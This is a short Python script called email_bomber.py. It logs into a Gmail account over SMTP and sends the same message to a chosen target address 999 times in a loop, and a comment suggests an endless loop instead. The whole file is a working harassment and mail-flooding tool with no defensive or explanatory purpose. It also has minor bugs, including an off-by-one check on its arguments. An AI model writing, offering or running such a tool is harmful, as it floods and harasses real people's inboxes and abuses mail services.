#!/usr/bin/env python
import smtplib
import sys

if len(sys.argv) < 4:
     print("Usage:\npython email_bomber.py sender@email.com email_pass target@email.com message")
     sys.exit(0)

sender = sys.argv[1]
reciver = sys.argv[3]
password = sys.argv[2]
subject = 'test email_bomber script'
header = 'From :{}\n'.format(sender)
header += 'To :{}\n'.format(reciver)
header += 'Subject :{}\n'.format(subject)
message = header + sys.argv[4]

server = smtplib.SMTP(host='smtp.gmail.com',port=587)
server.starttls()

try:
	server.login(sender,password)
	print(f"Logged in as {sender}")
except:
	print("Failed to login...")
	sys.exit(0)

for n in range(1,1000): # or you can use from "while true" loop
	try:
		server.sendmail(from_addr=sender,to_addrs=reciver,msg=message)
		print("Sent email {}", n)
	except:
		print("failed to send email...")

server.quit()
